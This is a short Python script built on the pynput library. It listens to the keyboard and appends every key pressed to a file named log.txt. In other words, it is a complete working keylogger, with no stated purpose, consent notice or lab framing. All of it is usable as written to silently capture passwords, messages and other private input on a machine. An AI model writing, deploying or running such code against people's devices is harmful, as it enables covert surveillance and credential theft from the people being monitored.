from pynput.keyboard import Listener

def on_press(key):
    key = str(key).replace("'", "")  # Clean up quotes
    with open("log.txt", "a") as file:
        file.write(f"{key} ")

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
